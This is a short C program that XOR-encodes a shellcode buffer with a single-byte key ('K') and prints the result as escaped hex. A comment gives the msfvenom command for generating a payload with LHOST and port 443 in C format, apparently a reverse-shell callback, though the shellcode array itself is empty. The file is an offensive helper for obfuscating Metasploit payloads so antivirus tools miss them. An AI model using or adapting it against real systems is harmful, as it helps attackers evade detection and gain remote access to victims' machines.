#include <stdio.h>

//msfvenom -p <payload> LHOST=eth0 LPORT=443 -f c
unsigned char code[] = "";

int main()
{
	//Make sure to use the same key for both encryption and decryption
	char key = 'K';
	int i = 0;
	for (i; i<sizeof(code); i++)
	{
		printf("\\x%02x",code[i]^key);
	}
	
}
